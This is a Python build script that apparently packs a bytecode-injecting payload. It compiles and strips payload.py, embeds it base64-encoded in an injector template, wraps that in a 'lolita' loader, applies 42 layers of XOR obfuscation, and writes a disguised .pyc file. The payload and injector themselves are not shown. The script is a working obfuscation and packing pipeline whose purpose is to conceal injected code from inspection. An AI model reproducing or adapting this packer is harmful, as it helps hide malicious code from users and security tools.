import marshal
import base64
import zlib
import imp

import byteplay
from obfuscation import obfuscate
import xor_layer


# ------------- GENERATING PAYLOAD DATA ---------------
payload_f = open("payload.py", "r")
payload = payload_f.read()
payload_f.close()
payload = byteplay.Code.from_code(compile(payload, "a", "exec"))
payload.code = payload.code[:-1]
for i, instr in enumerate(payload.code):
    if instr[0] == byteplay.SetLineno:
        payload.code.pop(i)
payload = base64.b64encode(marshal.dumps(payload.to_code()))

# ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
byteplay_f = open("byteplay.py", "r")
byteplay_src = base64.b64encode(zlib.compress(byteplay_f.read(), 9))
byteplay_f.close()

# ------------- GENERATING INJECTOR FILE ---------------
injector_f = open("injector.py", "r")
injector = injector_f.read()
injector_f.close()
injector = injector.replace("__PAYLOAD_PLACEHOLDER__", payload)
injector = injector.replace("__BYTEPLAY_PLACEHOLDER__", byteplay_src)
injector = compile(injector, "b", "exec")
injector = base64.b64encode(zlib.compress(marshal.dumps(injector), 9))


# ------------- GENERATING LOLITA (FINAL) FILE ---------------
lolita_f = open("lolita.py", "r")
lolita = lolita_f.read()
lolita_f.close()

lolita = lolita.replace("__FINAL_PLACEHOLDER__", injector)
lolita = compile(lolita, "b", "exec")

lolita = marshal.dumps(lolita)
for i in range(42):
    lolita = obfuscate(lolita, xor_layer)

lolita_f = open("lolita.final.pyc", "wb")

lolita_f.write(imp.get_magic() + ")\xb9\x1bQ")
lolita_f.write(lolita)
lolita_f.close()
